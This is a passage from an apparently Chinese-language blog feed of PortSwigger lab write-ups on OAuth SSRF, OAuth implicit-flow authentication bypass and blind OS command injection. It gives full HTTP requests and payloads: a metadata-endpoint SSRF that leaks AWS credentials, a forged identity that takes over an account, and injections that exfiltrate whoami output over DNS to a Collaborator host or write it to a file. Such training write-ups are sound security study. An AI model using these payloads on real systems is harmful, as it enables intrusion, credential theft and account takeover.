&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#ae81ff">204&lt;/span> &lt;span style="color:#a6e22e">No Content&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>再次尝试发送注册Request，但通过Burp Collaborator进行SSRF确认
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">POST&lt;/span> /reg &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Host&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">oauth-0a4e00680300598c829e5e1a02b4001d.oauth-server.net&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Content-Type&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">application/json&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;redirect_uris&amp;#34;&lt;/span> : [
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;https://example.com&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ],
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;logo_uri&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;https://zy1o9naqos7cl7panwuxbipwdnjg76vv.oastify.com&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#ae81ff">201&lt;/span> &lt;span style="color:#a6e22e">Created&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>...
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;#34;client_id&amp;#34;: &amp;#34;9TGhjHvJ5yt_dd8perlem&amp;#34;,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>...
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>再次访问logo页面
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">GET&lt;/span> /client/9TGhjHvJ5yt_dd8perlem/logo &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Host&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">oauth-0a4e00680300598c829e5e1a02b4001d.oauth-server.net&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#ae81ff">200&lt;/span> &lt;span style="color:#a6e22e">OK&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>z3rtv6ubc6nwvqezt9d66gzjlgigz
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>发现对应的ID，确认有SSRF
&lt;img alt="SSRF" src="/img/2024/oauth-lab-oauth-ssrf-via-openid-dynamic-client-registration-2.jpg">&lt;/li>
&lt;li>再次访问注册接口发送SSRF目的url
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">POST&lt;/span> /reg &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Host&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">oauth-0a4e00680300598c829e5e1a02b4001d.oauth-server.net&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Content-Type&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">application/json&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;redirect_uris&amp;#34;&lt;/span> : [
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;https://example.com&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ],
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;logo_uri&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#ae81ff">201&lt;/span> &lt;span style="color:#a6e22e">Created&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>...
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;#34;client_id&amp;#34;: &amp;#34;tAOED8w2AuaL-FxSbvIC3&amp;#34;,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>...
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>访问logo接口
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">GET&lt;/span> /client/tAOED8w2AuaL-FxSbvIC3/logo &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Host&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">oauth-0a4e00680300598c829e5e1a02b4001d.oauth-server.net&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#ae81ff">200&lt;/span> &lt;span style="color:#a6e22e">OK&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;#34;Code&amp;#34; : &amp;#34;Success&amp;#34;,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;#34;LastUpdated&amp;#34; : &amp;#34;2024-12-16T14:38:58.426705184Z&amp;#34;,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;#34;Type&amp;#34; : &amp;#34;AWS-HMAC&amp;#34;,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;#34;AccessKeyId&amp;#34; : &amp;#34;0diucLF19YlhXiJF7A72&amp;#34;,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;#34;SecretAccessKey&amp;#34; : &amp;#34;Nb9HY7w7BExzierfGxfOjvEuRIypEJgcoak1yx2l&amp;#34;,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;#34;Token&amp;#34; : &amp;#34;IFNf1gUdELbDeobXF7HuzY6UO9oIbmqVlZoGVz5FOgBrjTtj3MCdyWv4db8fWuz4im1IpTcNnlMX5XSLUOykAlqratcwiQ92TCTK2WmChL21TTT7c9ZITVr7kjECRDXxTASWCLQKLAqqBKQnj5o3ytsACHy3J0oekv2wQgMxSL3ApTwFyhdniVP1c79efZ3hHn6VZ700htMe6W4LdgJ4Y1JSutbcUxOIDR7k2oEKMiXIJk7ZJDRxTYbEZN5oZf1p&amp;#34;,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;#34;Expiration&amp;#34; : &amp;#34;2030-12-15T14:38:58.426705184Z&amp;#34;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>回到页面点击最上方&lt;code>Submit solution&lt;/code>输入&lt;code>Nb9HY7w7BExzierfGxfOjvEuRIypEJgcoak1yx2l&lt;/code>即可解题&lt;/li>
&lt;/ol></content></item><item><title>[Write Up]Lab: Authentication bypass via OAuth implicit flow</title><link>/portswigger-posts/oauth-lab-oauth-authentication-bypass-via-oauth-implicit-flow/</link><pubDate>Mon, 16 Dec 2024 21:43:57 +0800</pubDate><guid>/portswigger-posts/oauth-lab-oauth-authentication-bypass-via-oauth-implicit-flow/</guid><description>&lt;h2 id="lab-description">Lab description&lt;/h2>
&lt;p>&lt;img alt="Lab description" src="/img/2024/oauth-lab-oauth-authentication-bypass-via-oauth-implicit-flow-1.jpg">&lt;/p></description><content>&lt;h2 id="lab-description">Lab description&lt;/h2>
&lt;p>&lt;img alt="Lab description" src="/img/2024/oauth-lab-oauth-authentication-bypass-via-oauth-implicit-flow-1.jpg">&lt;/p>
&lt;h2 id="solution">Solution&lt;/h2>
&lt;ol>
&lt;li>使用&lt;code>wiener:peter&lt;/code>进行登录&lt;/li>
&lt;li>在进行&lt;code>OAuth&lt;/code>认证过程中出现Request
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">POST&lt;/span> /authenticate &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{&amp;#34;email&amp;#34;:&amp;#34;wiener@hotdog.com&amp;#34;,&amp;#34;username&amp;#34;:&amp;#34;wiener&amp;#34;,&amp;#34;token&amp;#34;:&amp;#34;rx9Etd148p5AaqjXJTQ9rQOy9ke9ci-Dp5Wav6iy_pc&amp;#34;}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#ae81ff">302&lt;/span> &lt;span style="color:#a6e22e">Found&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Location&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">/&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Set-Cookie&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">session=gYCR46I3JvHznVUjfpXa2OV1QOTDmPKn; Secure; HttpOnly; SameSite=None&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>修改&lt;code>email&lt;/code>、&lt;code>username&lt;/code>参数，后发送请求即可解题
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">POST&lt;/span> /authenticate &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{&amp;#34;email&amp;#34;:&amp;#34;carlos@carlos-montoya.net&amp;#34;,&amp;#34;username&amp;#34;:&amp;#34;carlos&amp;#34;,&amp;#34;token&amp;#34;:&amp;#34;rx9Etd148p5AaqjXJTQ9rQOy9ke9ci-Dp5Wav6iy_pc&amp;#34;}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#ae81ff">302&lt;/span> &lt;span style="color:#a6e22e">Found&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Location&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">/&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Set-Cookie&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">session=4NcHGKeMLuw7h4e94CiQLIfgcUyUIU1l; Secure; HttpOnly; SameSite=None&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;/ol></content></item><item><title>[Write Up]Lab: Blind OS command injection with out-of-band data exfiltration</title><link>/portswigger-posts/os-command-injection-lab-blind-out-of-band-data-exfiltration/</link><pubDate>Sun, 15 Dec 2024 22:06:11 +0800</pubDate><guid>/portswigger-posts/os-command-injection-lab-blind-out-of-band-data-exfiltration/</guid><description>&lt;h2 id="lab-description">Lab description&lt;/h2>
&lt;p>&lt;img alt="Lab description" src="/img/2024/os-command-injection-lab-blind-out-of-band-data-exfiltration-1.jpg">&lt;/p></description><content>&lt;h2 id="lab-description">Lab description&lt;/h2>
&lt;p>&lt;img alt="Lab description" src="/img/2024/os-command-injection-lab-blind-out-of-band-data-exfiltration-1.jpg">&lt;/p>
&lt;h2 id="solution">Solution&lt;/h2>
&lt;ol>
&lt;li>点击右上方&lt;code>Submit feedback&lt;/code>进行反馈页面，填写资料后点击最下方&lt;code>Submit feedback&lt;/code>，对应Request
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">POST&lt;/span> /feedback/submit &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>csrf=bRTAA5qKvCP2saW0Q4UKkfI6HyvGQBOh&amp;amp;name=1&amp;amp;email=email%40emai.com&amp;amp;subject=1&amp;amp;message=1
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>使用Burp Collaborator产生Collaborator server&lt;code>301sbrcuqw9gnbrep0w1dmr0frlj99xy.oastify.com&lt;/code>&lt;/li>
&lt;li>修改&lt;code>email&lt;/code>参数
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">POST&lt;/span> /feedback/submit &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>csrf=WjvWEJJjtVfpMJPsv274zP7r7KhFTrpe&amp;amp;name=1&amp;amp;email=x||nslookup+`whoami`.301sbrcuqw9gnbrep0w1dmr0frlj99xy.oastify.com||&amp;amp;subject=1&amp;amp;message=1
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#ae81ff">200&lt;/span> &lt;span style="color:#a6e22e">OK&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>发送请求后回到Burp Collaborator查看到DNS lookup记录，&lt;code>peter-jA42w0&lt;/code>即为&lt;code>whoami&lt;/code>的执行结果
&lt;img alt="DNS lookup" src="/img/2024/os-command-injection-lab-blind-out-of-band-data-exfiltration-2.jpg">&lt;/li>
&lt;li>返回页面点击最上方的&lt;code>Submit solution&lt;/code>并输入&lt;code>peter-jA42w0&lt;/code>，即可解题&lt;/li>
&lt;/ol></content></item><item><title>[Write Up]Lab: Blind OS command injection with out-of-band interaction</title><link>/portswigger-posts/os-command-injection-lab-blind-out-of-band/</link><pubDate>Sun, 15 Dec 2024 21:54:43 +0800</pubDate><guid>/portswigger-posts/os-command-injection-lab-blind-out-of-band/</guid><description>&lt;h2 id="lab-description">Lab description&lt;/h2>
&lt;p>&lt;img alt="Lab description" src="/img/2024/os-command-injection-lab-blind-out-of-band-1.jpg">&lt;/p></description><content>&lt;h2 id="lab-description">Lab description&lt;/h2>
&lt;p>&lt;img alt="Lab description" src="/img/2024/os-command-injection-lab-blind-out-of-band-1.jpg">&lt;/p>
&lt;h2 id="solution">Solution&lt;/h2>
&lt;ol>
&lt;li>点击右上方&lt;code>Submit feedback&lt;/code>进行反馈页面，填写资料后点击最下方&lt;code>Submit feedback&lt;/code>，对应Request
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">POST&lt;/span> /feedback/submit &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>csrf=WjvWEJJjtVfpMJPsv274zP7r7KhFTrpe&amp;amp;name=1&amp;amp;email=email%40email.com&amp;amp;subject=1&amp;amp;message=1
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>使用Burp Collaborator产生Collaborator server&lt;code>oskd3c4fih11fwjzhlom57jl7cd31tpi.oastify.com&lt;/code>&lt;/li>
&lt;li>修改&lt;code>email&lt;/code>参数为&lt;code>x||nslookup+oskd3c4fih11fwjzhlom57jl7cd31tpi.oastify.com||&lt;/code>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">POST&lt;/span> /feedback/submit &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>csrf=WjvWEJJjtVfpMJPsv274zP7r7KhFTrpe&amp;amp;name=1&amp;amp;email=x||nslookup+oskd3c4fih11fwjzhlom57jl7cd31tpi.oastify.com||&amp;amp;subject=1&amp;amp;message=1
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#ae81ff">200&lt;/span> &lt;span style="color:#a6e22e">OK&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>发送请求后回到Burp Collaborator查看到DNS lookup记录
&lt;img alt="DNS lookup" src="/img/2024/os-command-injection-lab-blind-out-of-band-2.jpg">&lt;/li>
&lt;li>返回页面并刷新后，即可解题&lt;/li>
&lt;/ol></content></item><item><title>[Write Up]Lab: Blind OS command injection with output redirection</title><link>/portswigger-posts/os-command-injection-lab-blind-output-redirection/</link><pubDate>Sun, 15 Dec 2024 21:37:30 +0800</pubDate><guid>/portswigger-posts/os-command-injection-lab-blind-output-redirection/</guid><description>&lt;h2 id="lab-description">Lab description&lt;/h2>
&lt;p>&lt;img alt="Lab description" src="/img/2024/os-command-injection-lab-blind-output-redirection-1.jpg">&lt;/p></description><content>&lt;h2 id="lab-description">Lab description&lt;/h2>
&lt;p>&lt;img alt="Lab description" src="/img/2024/os-command-injection-lab-blind-output-redirection-1.jpg">&lt;/p>
&lt;h2 id="solution">Solution&lt;/h2>
&lt;ol>
&lt;li>点击右上方&lt;code>Submit feedback&lt;/code>进行反馈页面，填写资料后点击最下方&lt;code>Submit feedback&lt;/code>，对应Request
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">POST&lt;/span> /feedback/submit &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>csrf=hWJPoizsRhwEmqpWy4YhB0OnDapdOJdV&amp;amp;name=1&amp;amp;email=email%40email.com&amp;amp;subject=1&amp;amp;message=1
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>修改&lt;code>email&lt;/code>参数为&lt;code>x||whoami&amp;gt;/var/www/images/output.txt||&lt;/code>，发送请求后即可解题
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">POST&lt;/span> /feedback/submit &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>csrf=v4rsJZlcJqDgYyINUfgiUM8uglmcIZtH&amp;amp;name=1&amp;amp;email=x||whoami&amp;gt;/var/www/images/output.txt||&amp;amp;subject=1&amp;amp;message=1
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#ae81ff">200&lt;/span> &lt;span style="color:#a6e22e">OK&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>参考图片请求，将上述输出路径设置入url&lt;code>/image?filename=output.txt&lt;/code>，即可解题
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-text" data-lang="text">&lt;span style="display:flex;">&lt;span>peter-00pfjq
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;/ol></content></item><item><title>[Write Up]Lab: Blind OS command injection with time delays</title><link>/portswigger-posts/os-command-injection-lab-blind-time-delays/</link><pubDate>Sun, 15 Dec 2024 21:28:55 +0800</pubDate><guid>/portswigger-posts/os-command-injection-lab-blind-time-delays/</guid><description>&lt;h2 id="lab-description">Lab description&lt;/h2>
&lt;p>&lt;img alt="Lab description" src="/img/2024/os-command-injection-lab-blind-time-delays-1.jpg">&lt;/p></description><content>&lt;h2 id="lab-description">Lab description&lt;/h2>
&lt;p>&lt;img alt="Lab description" src="/img/2024/os-command-injection-lab-blind-time-delays-1.jpg">&lt;/p>
&lt;h2 id="solution">Solution&lt;/h2>
&lt;ol>
&lt;li>点击右上方&lt;code>Submit feedback&lt;/code>进行反馈页面，填写资料后点击最下方&lt;code>Submit feedback&lt;/code>，对应Request
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">POST&lt;/span> /feedback/submit &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>csrf=hWJPoizsRhwEmqpWy4YhB0OnDapdOJdV&amp;amp;name=1&amp;amp;email=email%40email.com&amp;amp;subject=1&amp;amp;message=1
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>修改&lt;code>email&lt;/code>参数为&lt;code>x||ping+-c+10+127.0.0.1||&lt;/code>，发送请求后即可解题
